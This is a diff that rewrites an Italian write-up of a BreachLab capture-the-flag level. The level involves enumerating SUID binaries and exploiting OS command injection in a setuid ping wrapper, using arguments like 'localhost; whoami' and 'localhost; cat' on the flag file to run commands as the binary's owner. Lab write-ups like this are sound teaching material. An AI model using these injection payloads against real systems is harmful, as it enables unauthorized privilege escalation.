@@ -1,16 +1,26 @@
-# Phantom Track - Phantom 7
+```
+ ========================================================================
+   B R E A C H L A B   ::   F I E L D   N O T E S
+ ------------------------------------------------------------------------
+   phantom track · phile 0x07 · "local authority"
+ ========================================================================
 
-[← Torna all'indice](../../README.md)
+   target ..: phantom-07  "Local Authority"
+   class ...: privesc / SUID · OS command injection
+   tools ...: find · ping · un po' di ; malizia
+   author ..: noflyfre
+   status ..: owned
+```
 
-## Sommario
+[← indice](../../README.md)
 
-- Track: Phantom Track
-- Livello: Phantom 7 — Local Authority
-- Fonte appunti: `phantom_track/phantom07/notes.md`
+> un'utility di sistema custom gira con privilegi elevati. sembra
+> innocua: prende un hostname e lo controlla. la domanda giusta non è
+> "funziona?", è "e se quello che gli passo non è un hostname?".
 
-## Obiettivo
+## ----[ 0x00 · intel ]----
 
-Dal BRIEFING del livello:
+Dal briefing del livello:
 
 ```text
 MISSION: Local Authority
@@ -26,24 +36,28 @@ FLAG: owned by the user the SUID binary runs as (check `ls -l`
 on the binary — it is not root).
 ```
 
-Obiettivo: un binario custom SUID accetta un hostname come argomento; bisogna capire come lo elabora internamente e se è possibile forzarlo a eseguire comandi arbitrari con i suoi privilegi elevati.
+Tradotto: c'è un binario SUID che accetta un hostname. Bisogna capire
+come lo mastica dentro e se si può convincerlo a eseguire comandi
+arbitrari con i suoi privilegi.
 
-## Ricognizione
+## ----[ 0x01 · recon ]----
 
-Enumerazione dei binari SUID sul sistema:
+Prima cosa, censimento dei binari SUID sul sistema:
 
 ```bash
 find / -perm -4000 -exec ls -al {} \; 2>/dev/null
 ```
 
-Tra i risultati, filtrando per il proprio livello:
+Filtrando per il proprio livello salta fuori il candidato:
 
 ```bash
 find / -perm -4000 -exec ls -al {} \; 2>/dev/null | grep phantom7
 -rwsr-x--- 1 flagkeeper7 phantom7 16224 May 28 16:07 /usr/local/bin/system-checker
 ```
 
-Il binario `/usr/local/bin/system-checker` è SUID, di proprietà `flagkeeper7`, eseguibile dal gruppo `phantom7`. Interrogandolo:
+`system-checker` è SUID, di proprietà `flagkeeper7`, eseguibile dal
+gruppo `phantom7`. Non è root — e infatti la flag appartiene proprio a
+`flagkeeper7`. Lo si interroga:
 
 ```bash
 /usr/local/bin/system-checker --help
@@ -51,7 +65,8 @@ Il binario `/usr/local/bin/system-checker` è SUID, di proprietà `flagkeeper7`,
 [-] Host is unreachable.
 ```
 
-Il programma non riconosce `--help` come opzione: tratta letteralmente qualunque argomento come un hostname da controllare. Testando con un hostname valido:
+Non riconosce `--help` come opzione: tratta qualunque argomento come un
+hostname da pingare. Con un host valido:
 
 ```bash
 /usr/local/bin/system-checker localhost
@@ -65,17 +80,23 @@ rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
 [+] Host is reachable.
 ```
 
-Il comportamento conferma che il binario internamente invoca un comando di sistema `ping` sull'hostname fornito, mostrandone l'output grezzo.
+L'output grezzo di `ping` è la confessione: dentro il binario c'è un
+comando di sistema costruito con il nostro input.
 
-## Tecnica
+## ----[ 0x02 · il difetto ]----
 
-Il fatto che l'output di `ping` venga mostrato letteralmente suggerisce che l'argomento fornito dall'utente venga passato a una funzione come `system()` o `popen()`, probabilmente costruendo una stringa di comando tipo `ping -c 1 <input>` ed eseguendola tramite una shell. Se l'input non viene sanitizzato (niente whitelist di caratteri validi per hostname, nessun escaping dei metacaratteri di shell), è possibile iniettare un separatore di comando come `;` per concatenare un secondo comando arbitrario, che erediterà lo stesso EUID del processo — cioè quello del proprietario SUID del binario (`flagkeeper7`), non quello di chi lo esegue.
+Se l'output di `ping` esce così com'è, l'argomento sta finendo in una
+`system()` / `popen()` — quasi certamente una stringa tipo
+`ping -c 1 <input>` passata a una shell. Nessuna whitelist di caratteri,
+nessun escaping dei metacaratteri: basta un separatore come `;` per
+attaccare un secondo comando, che eredita l'EUID del processo — cioè
+`flagkeeper7`, il proprietario SUID, non chi lancia il binario.
 
-Questa è una classica **OS command injection** in un wrapper SUID.
+Classica **OS command injection** dentro un wrapper SUID.
 
-## Sfruttamento
+## ----[ 0x03 · exploit ]----
 
-1. Test con un separatore di comando (`;`) per verificare se l'input viene passato a una shell senza sanitizzazione:
+Prova del nove con un `;` e un `whoami`:
 
 ```bash
 /usr/local/bin/system-checker 'localhost; whoami'
@@ -90,9 +111,9 @@ flagkeeper7
 [+] Host is reachable.
 ```
 
-Il comando `ping` viene eseguito normalmente su `localhost`, e subito dopo viene eseguito `whoami`, che stampa `flagkeeper7` — non l'utente reale che ha lanciato il binario. Questo conferma sia la command injection sia il fatto che il processo gira con l'EUID del proprietario SUID del binario.
-
-2. Sostituzione del comando iniettato con la lettura diretta del file contenente la flag:
+`ping` gira su `localhost`, e subito dopo `whoami` stampa `flagkeeper7`.
+Injection confermata, e con essa il salto di privilegi. A quel punto si
+sostituisce il payload con la lettura diretta della flag:
 
 ```bash
 /usr/local/bin/system-checker 'localhost; cat /var/lib/phantom-flags/level7_flag'
@@ -107,20 +128,16 @@ rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
 [+] Host is reachable.
 ```
 
-## Risultato
+## ----[ 0x04 · loot ]----
 
-Sfruttando una command injection nel binario SUID `system-checker`, tramite l'iniezione di `; cat /var/lib/phantom-flags/level7_flag` nell'argomento hostname, è stato possibile eseguire un comando arbitrario con i privilegi del proprietario del binario (`flagkeeper7`), ottenendo la flag del livello:
+Iniettando `; cat /var/lib/phantom-flags/level7_flag` nell'argomento
+hostname, il comando gira con i privilegi di `flagkeeper7` e la flag
+esce insieme all'output di `ping`. Il valore letterale resta fuori: la
+lezione è che qualunque wrapper SUID che concatena input in una shell è
+un privesc che aspetta solo un `;`.
 
 ```
-<REDACTED_FLAG>
+--[ eof ]---------------------------------------------------------------
+
+  breachlab.org · phantom track
 ```
-
-## Nota di pubblicazione
-
-Questa è la versione pensata per pubblicazione su GitHub, secondo la dottrina BreachLab: il metodo (enumerazione dei binari SUID, individuazione della command injection tramite `;`, conferma con `whoami`, exploitation finale) è spiegato per intero — comandi, percorsi, nome del binario e sintassi restano in chiaro. È stato rimosso solo il valore letterale della flag finale.
-
----
-
-## Crediti
-
-Livello risolto su BreachLab — https://breachlab.org (Phantom Track). Writeup pubblicato nel rispetto delle regole della piattaforma: si insegna la tecnica, non si condivide la risposta.
